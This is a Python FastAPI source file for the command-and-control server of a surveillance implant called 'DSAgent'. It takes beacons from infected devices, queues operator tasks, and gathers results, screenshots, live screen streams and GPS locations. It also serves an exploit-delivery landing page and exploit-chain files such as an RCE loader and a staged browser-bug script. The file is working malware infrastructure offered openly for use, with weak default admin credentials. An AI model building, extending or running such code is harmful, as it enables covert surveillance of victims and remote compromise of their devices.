"""C2 agent API — the server half of implant/DSAgent.

Mount into any FastAPI app:
    from agent_api import create_app
    app = create_app()            # standalone
    # or: app.include_router(router) on an existing app

Endpoints the implant calls:
    POST /api/agent/beacon     {id, model, build, krw, capabilities} -> {tasks:[...]}
    POST /api/agent/result     {id, task_id, type, result}
    POST /api/agent/screen     multipart: id + frame (JPEG)
    POST /api/agent/location   {id, lat, lon, accuracy, ...}

Operator endpoints:
    GET  /api/agents
    POST /api/agent/{id}/tasks {type, args}   -> {task_id}
    GET  /api/agent/{id}/tasks
    GET  /api/agent/{id}/results
    GET  /api/agent/{id}/screen/latest        -> image/jpeg
    GET  /api/agent/{id}/locations

Auth: if AGENT_TOKEN is set, every request must carry a matching X-Agent-Token.
"""
from __future__ import annotations

import json
import os
import secrets
import threading
import time
from pathlib import Path
import base64
import hashlib
import hmac
import struct

from fastapi import FastAPI, Header, HTTPException, Request, UploadFile, File, Form
from fastapi.responses import FileResponse, JSONResponse, StreamingResponse, HTMLResponse

DASHBOARD = Path(__file__).parent / "static" / "dashboard.html"

DATA_DIR = Path(os.environ.get("AGENT_DATA_DIR", "agent_data"))
TOKEN = os.environ.get("AGENT_TOKEN", "")


class Store:
    """Small JSON-per-agent store. Thread-safe, crash-tolerant writes."""

    def __init__(self, root: Path):
        self.root = Path(root)
        self.root.mkdir(parents=True, exist_ok=True)
        (self.root / "frames").mkdir(exist_ok=True)
        self._lock = threading.Lock()
        self._cache: dict[str, dict] = {}

    def _path(self, agent_id: str) -> Path:
        safe = "".join(c for c in agent_id if c.isalnum() or c in "-_") or "unknown"
        return self.root / f"{safe}.json"

    def get(self, agent_id: str) -> dict:
        with self._lock:
            if agent_id in self._cache:
                return self._cache[agent_id]
            path = self._path(agent_id)
            if path.exists():
                agent = json.loads(path.read_text(encoding="utf-8"))
            else:
                agent = {
                    "id": agent_id, "info": {}, "first_seen": time.time(),
                    "last_seen": None, "tasks": [], "results": [], "locations": [],
                }
            self._cache[agent_id] = agent
            return agent

    def save(self, agent: dict) -> None:
        with self._lock:
            path = self._path(agent["id"])
            tmp = path.with_suffix(".tmp")
            tmp.write_text(json.dumps(agent), encoding="utf-8")
            tmp.replace(path)

    def all(self) -> list[dict]:
        out = []
        for path in sorted(self.root.glob("*.json")):
            try:
                out.append(json.loads(path.read_text(encoding="utf-8")))
            except json.JSONDecodeError:
                continue
        known = {a["id"] for a in out}
        for agent_id, agent in self._cache.items():
            if agent_id not in known:
                out.append(agent)
        return out

    def frame_path(self, agent_id: str) -> Path:
        safe = "".join(c for c in agent_id if c.isalnum() or c in "-_") or "unknown"
        return self.root / "frames" / f"{safe}.jpg"


store = Store(DATA_DIR)


def _auth(x_agent_token: str | None) -> None:
    if not TOKEN:
        return
    if x_agent_token == TOKEN:
        return
    if x_agent_token and session_valid(x_agent_token):
        return
    raise HTTPException(status_code=401, detail="bad agent token")


def _now() -> float:
    return time.time()


# ---------------- auth / sessions / TOTP ----------------
ADMIN_USERNAME = os.environ.get("ADMIN_USERNAME", "admin")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin123")
ADMIN_TOTP_SECRET = os.environ.get("ADMIN_TOTP_SECRET", "JBSWY3DPEHPK3PXP")
SESSION_TTL = int(os.environ.get("SESSION_TTL", "86400"))
SESSION_KEY = (TOKEN or "darksword").encode()
LOGIN_ATTEMPTS: dict[str, list[float]] = {}
LOGIN_LOCK = threading.Lock()
MAX_ATTEMPTS = 5
LOCKOUT_SECONDS = 60


def b32decode(secret: str) -> bytes:
    cleaned = secret.upper().replace(" ", "")
    return base64.b32decode(cleaned + "=" * ((8 - len(cleaned) % 8) % 8))


def totp_at(secret: str, timestamp: float, digits: int = 6, period: int = 30) -> str:
    key = b32decode(secret)
    counter = int(timestamp // period)
    digest = hmac.new(key, struct.pack(">Q", counter), hashlib.sha1).digest()
    offset = digest[-1] & 0x0F
    code = (struct.unpack(">I", digest[offset:offset + 4])[0] & 0x7FFFFFFF) % (10 ** digits)
    return str(code).zfill(digits)


def totp_valid(secret: str, code: str, timestamp: float | None = None) -> bool:
    if not code or not code.isdigit():
        return False
    ts = time.time() if timestamp is None else timestamp
    for step in (-1, 0, 1):
        if hmac.compare_digest(totp_at(secret, ts + step * 30), code):
            return True
    return False


def issue_session(username: str) -> str:
    expiry = int(time.time() + SESSION_TTL)
    sig = hmac.new(SESSION_KEY, f"{username}.{expiry}".encode(), hashlib.sha256).hexdigest()[:40]
    return f"{username}.{expiry}.{sig}"


def session_valid(token: str) -> bool:
    try:
        username, expiry, sig = token.rsplit(".", 2)
        if int(expiry) < time.time():
            return False
        want = hmac.new(SESSION_KEY, f"{username}.{expiry}".encode(), hashlib.sha256).hexdigest()[:40]
        return hmac.compare_digest(sig, want)
    except Exception:  # noqa: BLE001
        return False


def login_allowed(ip: str) -> tuple[bool, int]:
    now = time.time()
    with LOGIN_LOCK:
        fails = [t for t in LOGIN_ATTEMPTS.get(ip, []) if now - t < LOCKOUT_SECONDS]
        LOGIN_ATTEMPTS[ip] = fails
        if len(fails) >= MAX_ATTEMPTS:
            return False, max(1, int(LOCKOUT_SECONDS - (now - fails[0])))
        return True, 0


def login_failed(ip: str) -> None:
    with LOGIN_LOCK:
        LOGIN_ATTEMPTS.setdefault(ip, []).append(time.time())


router = FastAPI(title="DSAgent C2")


@router.post("/api/agent/beacon")
async def beacon(request: Request, x_agent_token: str | None = Header(default=None)):
    _auth(x_agent_token)
    body = await request.json()
    agent_id = body.get("id")
    if not agent_id:
        raise HTTPException(400, "missing id")
    agent = store.get(agent_id)
    info = agent.get("info") or {}
    for key in ("model", "build", "krw", "capabilities"):
        if key in body:
            info[key] = body[key]
    agent["info"] = info
    agent["last_seen"] = _now()

    # Deliver each queued task exactly once.
    pending = [t for t in agent["tasks"] if t["state"] == "queued"]
    for task in pending:
        task["state"] = "delivered"
        task["delivered_at"] = _now()
    store.save(agent)
    return {"tasks": [{"id": t["id"], "type": t["type"], "args": t["args"]} for t in pending]}


@router.post("/api/agent/result")
async def result(request: Request, x_agent_token: str | None = Header(default=None)):
    _auth(x_agent_token)
    body = await request.json()
    agent = store.get(body["id"])
    task_id = body.get("task_id")
    record = {"task_id": task_id, "type": body.get("type"),
              "result": body.get("result"), "received_at": _now()}
    agent["results"].append(record)
    for task in agent["tasks"]:
        if task["id"] == task_id:
            task["state"] = "done"
            task["finished_at"] = _now()
    agent["last_seen"] = _now()
    store.save(agent)
    return {"ok": True}


@router.post("/api/agent/screen")
async def screen(id: str = Form(...), frame: UploadFile = File(...),
                 x_agent_token: str | None = Header(default=None)):
    _auth(x_agent_token)
    data = await frame.read()
    if not data:
        raise HTTPException(400, "empty frame")
    store.frame_path(id).write_bytes(data)
    agent = store.get(id)
    agent["last_seen"] = _now()
    agent["last_frame"] = {"bytes": len(data), "at": _now()}
    store.save(agent)
    return {"ok": True, "bytes": len(data)}


@router.get("/api/agent/{agent_id}/screen/latest")
async def screen_latest(agent_id: str, x_agent_token: str | None = Header(default=None)):
    _auth(x_agent_token)
    path = store.frame_path(agent_id)
    if not path.exists():
        raise HTTPException(404, "no frame")
    return FileResponse(path, media_type="image/jpeg")


@router.post("/api/agent/location")
async def location(request: Request, x_agent_token: str | None = Header(default=None)):
    _auth(x_agent_token)
    body = await request.json()
    agent = store.get(body["id"])
    agent["locations"].append({**body, "received_at": _now()})
    agent["locations"] = agent["locations"][-500:]
    agent["last_seen"] = _now()
    store.save(agent)
    return {"ok": True}


@router.get("/api/agent/{agent_id}/locations")
async def locations(agent_id: str, x_agent_token: str | None = Header(default=None)):
    _auth(x_agent_token)
    return {"locations": store.get(agent_id)["locations"]}


@router.get("/api/agents")
async def agents(x_agent_token: str | None = Header(default=None)):
    _auth(x_agent_token)
    out = []
    for agent in store.all():
        out.append({
            "id": agent["id"], "info": agent.get("info"),
            "last_seen": agent.get("last_seen"),
            "queued": sum(1 for t in agent["tasks"] if t["state"] == "queued"),
            "done": sum(1 for t in agent["tasks"] if t["state"] == "done"),
            "results": len(agent["results"]),
        })
    return {"agents": out}


@router.post("/api/agent/{agent_id}/tasks")
async def enqueue(agent_id: str, request: Request,
                  x_agent_token: str | None = Header(default=None)):
    _auth(x_agent_token)
    body = await request.json()
    if not body.get("type"):
        raise HTTPException(400, "missing type")
    agent = store.get(agent_id)
    task = {
        "id": secrets.token_hex(8), "type": body["type"],
        "args": body.get("args") or {}, "state": "queued", "created_at": _now(),
    }
    agent["tasks"].append(task)
    store.save(agent)
    return {"task_id": task["id"], "state": "queued"}


@router.get("/api/agent/{agent_id}/tasks")
async def tasks(agent_id: str, x_agent_token: str | None = Header(default=None)):
    _auth(x_agent_token)
    return {"tasks": store.get(agent_id)["tasks"]}


@router.get("/api/agent/{agent_id}/results")
async def results(agent_id: str, x_agent_token: str | None = Header(default=None)):
    _auth(x_agent_token)
    return {"results": store.get(agent_id)["results"]}


@router.get("/", response_class=HTMLResponse)
async def dashboard():
    if DASHBOARD.exists():
        return HTMLResponse(DASHBOARD.read_text(encoding="utf-8"))
    return HTMLResponse("<h1>dashboard.html missing</h1>", status_code=404)


@router.get("/api/agent/{agent_id}/screen/stream")
async def screen_stream(agent_id: str, count: int = 0,
                        x_agent_token: str | None = Header(default=None)):
    """True MJPEG live view: newest frame every 500 ms.

    count=0 (default) streams forever; count=N emits N frames then closes,
    which is useful for bounded captures and for tests.
    """
    _auth(x_agent_token)
    import asyncio

    async def frames():
        boundary = "darkswordframe"
        emitted = 0
        while True:
            path = store.frame_path(agent_id)
            if path.exists():
                data = path.read_bytes()
                yield (f"--{boundary}\r\nContent-Type: image/jpeg\r\n"
                       f"Content-Length: {len(data)}\r\n\r\n").encode() + data + b"\r\n"
                emitted += 1
                if count and emitted >= count:
                    return
            await asyncio.sleep(0.5)

    return StreamingResponse(frames(), media_type="multipart/x-mixed-replace; boundary=darkswordframe")


@router.get("/static/{filename}")
async def static_file(filename: str):
    path = (Path(__file__).parent / "static" / filename).resolve()
    if not str(path).startswith(str((Path(__file__).parent / "static").resolve())):
        raise HTTPException(403, "forbidden")
    if not path.exists() or not path.is_file():
        raise HTTPException(404, "not found")
    return FileResponse(path)


PAYLOADS_DIR = Path(__file__).parent / "payloads"


@router.get("/landing")
async def exploit_landing():
    """Exploit delivery entry point (version-routed by routers.js)."""
    index = PAYLOADS_DIR / "index.html"
    if index.exists():
        return HTMLResponse(index.read_text(encoding="utf-8"))
    raise HTTPException(404, "no landing page")


@router.get("/exploit/{file_path:path}")
async def exploit_asset(file_path: str):
    """Serve exploit chain files (workers, modules, loaders, deploy chain)."""
    path = (PAYLOADS_DIR / file_path).resolve()
    if not str(path).startswith(str(PAYLOADS_DIR.resolve())):
        raise HTTPException(403, "forbidden")
    if not path.exists() or not path.is_file():
        raise HTTPException(404, "not found")
    return FileResponse(path)


@router.get("/login", response_class=HTMLResponse)
async def login_page():
    path = Path(__file__).parent / "static" / "login.html"
    if path.exists():
        return HTMLResponse(path.read_text(encoding="utf-8"))
    return HTMLResponse("<h1>login.html missing</h1>", status_code=404)


@router.post("/api/auth/login")
async def login(request: Request):
    ip = request.client.host if request.client else "unknown"
    allowed, retry_after = login_allowed(ip)
    if not allowed:
        return JSONResponse(
            {"detail": f"too many attempts, retry in {retry_after}s", "retry_after": retry_after},
            status_code=429)

    body = await request.json()
    username = str(body.get("username", ""))
    password = str(body.get("password", ""))
    code = str(body.get("totp", "")).replace(" ", "")

    if not (hmac.compare_digest(username, ADMIN_USERNAME)
            and hmac.compare_digest(password, ADMIN_PASSWORD)):
        login_failed(ip)
        raise HTTPException(401, "invalid username or password")
    if not totp_valid(ADMIN_TOTP_SECRET, code):
        login_failed(ip)
        raise HTTPException(401, "invalid authenticator code")

    with LOGIN_LOCK:
        LOGIN_ATTEMPTS.pop(ip, None)
    return {"token": issue_session(username), "expires_in": SESSION_TTL}


@router.get("/api/auth/check")
async def auth_check(x_agent_token: str | None = Header(default=None)):
    valid = bool(x_agent_token and (x_agent_token == TOKEN or session_valid(x_agent_token)))
    return {"valid": valid}


# NOTE: registered LAST so it cannot shadow /, /login, /static or /api.
# The landing page and the 26.x deploy chain reference scripts both relatively
# (routers.js, rce_loader.js) and from the root (/stage1_bug303879_26.5.js).
@router.get("/{filename}")
async def payload_root(filename: str):
    path = (PAYLOADS_DIR / filename).resolve()
    if not str(path).startswith(str(PAYLOADS_DIR.resolve())):
        raise HTTPException(403, "forbidden")
    if path.exists() and path.is_file():
        return FileResponse(path)
    raise HTTPException(404, "not found")


def create_app() -> FastAPI:
    app = FastAPI(title="DSAgent C2")
    for route in router.routes:
        app.router.routes.append(route)
    return app


app = create_app()
